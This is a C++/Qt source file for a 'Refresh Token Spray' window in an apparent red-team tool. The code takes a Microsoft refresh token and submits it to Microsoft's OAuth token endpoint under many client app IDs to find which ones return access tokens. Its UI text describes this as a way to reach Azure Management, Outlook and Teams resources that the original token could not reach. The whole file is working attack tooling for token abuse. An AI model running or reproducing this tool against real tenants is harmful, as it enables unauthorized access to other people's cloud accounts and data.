#include "RefreshTokenSprayWindow.h"
#include "UserSelectorWidget.h"
#include "TokenStore.h"
#include "NetworkHelper.h"
#include "../shared/Protocol.h"

#include <QHeaderView>
#include <QJsonDocument>
#include <QJsonObject>
#include <QFile>
#include <QDir>
#include <QCoreApplication>
#include <QFileDialog>
#include <QTextStream>
#include <QMessageBox>
#include <QClipboard>
#include <QApplication>
#include <QUrlQuery>

RefreshTokenSprayWindow::RefreshTokenSprayWindow(QWidget *parent)
    : QWidget(parent), net(new QNetworkAccessManager(this)),
      currentAppIndex(0), successCount(0), failCount(0)
{
    setAttribute(Qt::WA_DeleteOnClose);
    setWindowTitle("Refresh Token Spray");
    sprayTimer = new QTimer(this);
    sprayTimer->setSingleShot(true);
    connect(sprayTimer, &QTimer::timeout, this, &RefreshTokenSprayWindow::processNextApp);
    setupUi();
    loadAppList();
}

RefreshTokenSprayWindow::~RefreshTokenSprayWindow()
{
    cancelRequested = true;
    sprayTimer->stop();
    for (auto *reply : activeReplies) {
        reply->disconnect();
        reply->abort();
    }
    activeReplies.clear();
}

void RefreshTokenSprayWindow::setupUi()
{
    mainLayout = new QVBoxLayout(this);

    auto *infoLabel = new QLabel(
        "<b>Refresh Token Spray</b> - Test refresh token against multiple Microsoft app IDs<br>"
        "<i>Red Team Value:</i> A refresh token may work with different apps, unlocking access to "
        "resources the original token couldn't reach (e.g., Azure Management, Outlook, Teams).", this);
    infoLabel->setStyleSheet("color: #ffc107; padding: 8px; background: #2a2a2a; border-radius: 3px;");
    infoLabel->setWordWrap(true);
    mainLayout->addWidget(infoLabel);

    // Token input
    auto *tokenGroup = new QGroupBox("Refresh Token", this);
    auto *tokenLayout = new QVBoxLayout(tokenGroup);

    userSelector = new UserSelectorWidget(this);
    tokenLayout->addWidget(userSelector);

    auto *tokenRow = new QHBoxLayout();
    refreshTokenInput = new QLineEdit(this);
    refreshTokenInput->setPlaceholderText("Paste refresh token (starts with 0. or similar)");
    refreshTokenInput->setEchoMode(QLineEdit::Password);
    tokenRow->addWidget(new QLabel("Refresh Token:", this));
    tokenRow->addWidget(refreshTokenInput);
    tokenLayout->addLayout(tokenRow);

    auto *tenantRow = new QHBoxLayout();
    tenantInput = new QLineEdit(this);
    tenantInput->setPlaceholderText("Tenant ID or 'common'");
    tenantInput->setText("common");
    tenantRow->addWidget(new QLabel("Tenant:", this));
    tenantRow->addWidget(tenantInput);
    tokenLayout->addLayout(tenantRow);

    mainLayout->addWidget(tokenGroup);

    // Options
    auto *optionsGroup = new QGroupBox("Spray Options", this);
    auto *optionsLayout = new QHBoxLayout(optionsGroup);

    optionsLayout->addWidget(new QLabel("API Version:", this));
    apiVersionCombo = new QComboBox(this);
    apiVersionCombo->addItem("v2.0 (Modern)", "v2.0");
    apiVersionCombo->addItem("v1.0 (Legacy)", "v0");
    apiVersionCombo->addItem("Both", "both");
    optionsLayout->addWidget(apiVersionCombo);

    optionsLayout->addSpacing(20);

    optionsLayout->addWidget(new QLabel("Delay (ms):", this));
    delaySpinBox = new QSpinBox(this);
    delaySpinBox->setRange(100, 10000);
    delaySpinBox->setValue(1000);
    delaySpinBox->setToolTip("Delay between requests to avoid rate limiting");
    optionsLayout->addWidget(delaySpinBox);

    optionsLayout->addSpacing(20);

    checkPrivsCheckbox = new QCheckBox("Check privileges on success", this);
    checkPrivsCheckbox->setToolTip("Test if successful tokens can enumerate users/apps");
    optionsLayout->addWidget(checkPrivsCheckbox);

    optionsLayout->addStretch();

    mainLayout->addWidget(optionsGroup);

    // Controls
    auto *controlLayout = new QHBoxLayout();

    startBtn = new QPushButton("Start Spray", this);
    startBtn->setStyleSheet("QPushButton { background-color: #28a745; color: white; font-weight: bold; padding: 8px 16px; }");
    connect(startBtn, &QPushButton::clicked, this, &RefreshTokenSprayWindow::startSpray);

    cancelBtn = new QPushButton("Cancel", this);
    cancelBtn->setStyleSheet("QPushButton { background-color: #dc3545; color: white; font-weight: bold; }");
    cancelBtn->setEnabled(false);
    connect(cancelBtn, &QPushButton::clicked, this, &RefreshTokenSprayWindow::cancelSpray);

    loadAppsBtn = new QPushButton("Reload Apps", this);
    loadAppsBtn->setToolTip("Reload app list from helpers/auth_apps.json");
    connect(loadAppsBtn, &QPushButton::clicked, this, &RefreshTokenSprayWindow::loadAppList);

    exportBtn = new QPushButton("Export", this);
    exportBtn->setEnabled(false);
    connect(exportBtn, &QPushButton::clicked, this, &RefreshTokenSprayWindow::exportResults);

    copyBtn = new QPushButton("Copy Successful", this);
    connect(copyBtn, &QPushButton::clicked, this, &RefreshTokenSprayWindow::copySuccessful);

    controlLayout->addWidget(startBtn);
    controlLayout->addWidget(cancelBtn);
    controlLayout->addWidget(loadAppsBtn);
    controlLayout->addStretch();
    controlLayout->addWidget(exportBtn);
    controlLayout->addWidget(copyBtn);

    mainLayout->addLayout(controlLayout);

    // Progress
    progressBar = new QProgressBar(this);
    progressBar->setVisible(false);
    mainLayout->addWidget(progressBar);

    statsLabel = new QLabel(this);
    statsLabel->setStyleSheet("color: #888;");
    mainLayout->addWidget(statsLabel);

    // Results table
    auto *resultsGroup = new QGroupBox("Results", this);
    auto *resultsLayout = new QVBoxLayout(resultsGroup);

    resultsTable = new QTableWidget(0, 4, this);
    resultsTable->setHorizontalHeaderLabels({"App Name", "App ID", "Status", "Scopes / Error"});
    resultsTable->horizontalHeader()->setStretchLastSection(true);
    resultsTable->horizontalHeader()->setSectionResizeMode(QHeaderView::ResizeToContents);
    resultsTable->setSelectionBehavior(QAbstractItemView::SelectRows);
    resultsTable->setAlternatingRowColors(true);
    resultsTable->setEditTriggers(QAbstractItemView::NoEditTriggers);

    resultsLayout->addWidget(resultsTable);
    mainLayout->addWidget(resultsGroup);

    // Log output
    auto *logGroup = new QGroupBox("Activity Log", this);
    auto *logLayout = new QVBoxLayout(logGroup);
    logOutput = new QTextEdit(this);
    logOutput->setReadOnly(true);
    logOutput->setMaximumHeight(120);
    logLayout->addWidget(logOutput);
    mainLayout->addWidget(logGroup);

    resize(900, 700);
}

void RefreshTokenSprayWindow::loadAppList()
{
    appList = QJsonArray();

    QString appPath = QCoreApplication::applicationDirPath() + "/../helpers/auth_apps.json";
    QFile file(appPath);

    if (!file.exists()) {
        appPath = "helpers/auth_apps.json";
        file.setFileName(appPath);
    }

    if (!file.open(QIODevice::ReadOnly)) {
        logError(QString("Could not load app list from %1").arg(appPath));
        statsLabel->setText("App list not loaded - check helpers/auth_apps.json");
        return;
    }

    QJsonDocument doc = QJsonDocument::fromJson(file.readAll());
    file.close();

    QJsonObject root = doc.object();
    int totalApps = 0;

    for (const QString &version : root.keys()) {
        QJsonArray apps = root[version].toArray();
        for (const QJsonValue &v : apps) {
            QJsonObject app = v.toObject();
            QString name = app.keys().first();
            QString id = app[name].toString();

            QJsonObject entry;
            entry["name"] = name;
            entry["id"] = id;
            entry["version"] = version;
            appList.append(entry);
            totalApps++;
        }
    }

    statsLabel->setText(QString("Loaded %1 apps from auth_apps.json").arg(totalApps));
    logInfo(QString("Loaded %1 apps for spraying").arg(totalApps));
}

void RefreshTokenSprayWindow::startSpray()
{
    QString refreshToken = refreshTokenInput->text().trimmed();
    QString tenant = tenantInput->text().trimmed();

    if (refreshToken.isEmpty()) {
        logError("Please provide a refresh token");
        return;
    }

    if (tenant.isEmpty()) {
        tenant = "common";
        tenantInput->setText(tenant);
    }

    if (appList.isEmpty()) {
        logError("No apps loaded. Check helpers/auth_apps.json");
        return;
    }

    resultsTable->setRowCount(0);
    currentAppIndex = 0;
    successCount = 0;
    failCount = 0;
    cancelRequested = false;

    setLoading(true);
    logInfo(QString("Starting refresh token spray against %1 apps...").arg(appList.size()));

    processNextApp();
}

void RefreshTokenSprayWindow::processNextApp()
{
    if (cancelRequested || currentAppIndex >= appList.size()) {
        setLoading(false);
        logInfo(QString("Spray complete. Success: %1, Failed: %2").arg(successCount).arg(failCount));
        exportBtn->setEnabled(successCount > 0);
        return;
    }

    QJsonObject app = appList[currentAppIndex].toObject();
    QString appName = app["name"].toString();
    QString appId = app["id"].toString();
    QString version = app["version"].toString();

    QString selectedVersion = apiVersionCombo->currentData().toString();
    if (selectedVersion != "both" && version != selectedVersion) {
        currentAppIndex++;
        processNextApp();
        return;
    }

    progressBar->setValue((currentAppIndex * 100) / appList.size());
    statsLabel->setText(QString("Testing %1/%2: %3").arg(currentAppIndex + 1).arg(appList.size()).arg(appName));

    sprayApp(appName, appId, version);
}

void RefreshTokenSprayWindow::sprayApp(const QString &appName, const QString &appId, const QString &version)
{
    QString refreshToken = refreshTokenInput->text().trimmed();
    QString tenant = tenantInput->text().trimmed();

    QString url;
    QUrlQuery params;

    params.addQueryItem("client_id", appId);
    params.addQueryItem("grant_type", "refresh_token");
    params.addQueryItem("refresh_token", refreshToken);

    if (version == "v2.0") {
        url = QString("https://login.microsoftonline.com/%1/oauth2/v2.0/token").arg(tenant);
        params.addQueryItem("scope", "openid offline_access");
    } else {
        url = QString("https://login.microsoftonline.com/%1/oauth2/token").arg(tenant);
        params.addQueryItem("resource", "https://graph.microsoft.com");
    }

    QNetworkRequest req;
    req.setUrl(QUrl(url));
    req.setHeader(QNetworkRequest::ContentTypeHeader, "application/x-www-form-urlencoded");
    req.setTransferTimeout(15000);

    QNetworkReply *reply = net->post(req, params.toString(QUrl::FullyEncoded).toUtf8());
    activeReplies.append(reply);

    connect(reply, &QNetworkReply::finished, this, [this, reply, appName, appId]() {
        activeReplies.removeOne(reply);
        reply->deleteLater();

        if (cancelRequested) {
            setLoading(false);
            return;
        }

        QJsonDocument doc = QJsonDocument::fromJson(reply->readAll());
        QJsonObject resp = doc.object();

        if (resp.contains("access_token")) {
            successCount++;
            QString scopes = resp["scope"].toString();
            if (scopes.isEmpty()) {
                scopes = "Token obtained";
            }
            addResult(appName, appId, true, scopes);
            logSuccess(QString("SUCCESS: %1 (%2)").arg(appName, appId));

            if (checkPrivsCheckbox->isChecked()) {
                // TODO: Could add privilege check here
            }
        } else {
            failCount++;
            QString error = resp["error"].toString();
            QString desc = resp["error_description"].toString();
            if (desc.length() > 100) desc = desc.left(100) + "...";
            addResult(appName, appId, false, QString(), error.isEmpty() ? desc : error);
        }

        currentAppIndex++;
        int delay = delaySpinBox->value();
        sprayTimer->start(delay);
    });
}

void RefreshTokenSprayWindow::addResult(const QString &appName, const QString &appId, bool success,
                                         const QString &scopes, const QString &error)
{
    int row = resultsTable->rowCount();
    resultsTable->insertRow(row);

    resultsTable->setItem(row, 0, new QTableWidgetItem(appName));
    resultsTable->setItem(row, 1, new QTableWidgetItem(appId));

    auto *statusItem = new QTableWidgetItem(success ? "SUCCESS" : "FAILED");
    statusItem->setForeground(success ? QColor("#00ff00") : QColor("#ff6666"));
    if (success) {
        statusItem->setFont(QFont(statusItem->font().family(), -1, QFont::Bold));
    }
    resultsTable->setItem(row, 2, statusItem);

    resultsTable->setItem(row, 3, new QTableWidgetItem(success ? scopes : error));

    if (success) {
        resultsTable->scrollToItem(statusItem);
    }
}

void RefreshTokenSprayWindow::cancelSpray()
{
    cancelRequested = true;
    sprayTimer->stop();
    for (auto *reply : activeReplies) {
        reply->abort();
    }
    logInfo("Spray cancelled by user");
    setLoading(false);
}

void RefreshTokenSprayWindow::setLoading(bool loading)
{
    startBtn->setEnabled(!loading);
    cancelBtn->setEnabled(loading);
    refreshTokenInput->setEnabled(!loading);
    tenantInput->setEnabled(!loading);
    apiVersionCombo->setEnabled(!loading);
    progressBar->setVisible(loading);

    if (!loading) {
        progressBar->setValue(100);
    }
}

void RefreshTokenSprayWindow::exportResults()
{
    QString filename = QFileDialog::getSaveFileName(this, "Export Results", "refresh_spray.csv", "CSV Files (*.csv)");
    if (filename.isEmpty()) return;

    QFile file(filename);
    if (!file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QMessageBox::critical(this, "Error", "Could not open file for writing");
        return;
    }

    QTextStream out(&file);
    out << "App Name,App ID,Status,Scopes/Error\n";

    for (int row = 0; row < resultsTable->rowCount(); row++) {
        QStringList cols;
        for (int col = 0; col < resultsTable->columnCount(); col++) {
            QString cell = resultsTable->item(row, col)->text();
            cell.replace("\"", "\"\"");
            cols.append(QString("\"%1\"").arg(cell));
        }
        out << cols.join(",") << "\n";
    }

    file.close();
    logSuccess(QString("Exported to %1").arg(filename));
}

void RefreshTokenSprayWindow::copySuccessful()
{
    QStringList successful;
    for (int row = 0; row < resultsTable->rowCount(); row++) {
        if (resultsTable->item(row, 2)->text() == "SUCCESS") {
            QString appId = resultsTable->item(row, 1)->text();
            successful.append(appId);
        }
    }

    if (successful.isEmpty()) {
        QMessageBox::information(this, "Copy", "No successful results to copy");
        return;
    }

    QApplication::clipboard()->setText(successful.join("\n"));
    logInfo(QString("Copied %1 successful app IDs to clipboard").arg(successful.size()));
}

void RefreshTokenSprayWindow::appendLog(const QString &msg, const QString &color)
{
    logOutput->append(QString("<span style='color:%1;'>%2</span>").arg(color, msg));
}

void RefreshTokenSprayWindow::logInfo(const QString &msg)
{
    appendLog(QString("[*] %1").arg(msg), "#888888");
}

void RefreshTokenSprayWindow::logSuccess(const QString &msg)
{
    appendLog(QString("[+] %1").arg(msg), "#00ff00");
}

void RefreshTokenSprayWindow::logError(const QString &msg)
{
    appendLog(QString("[!] %1").arg(msg), "#ff6666");
}
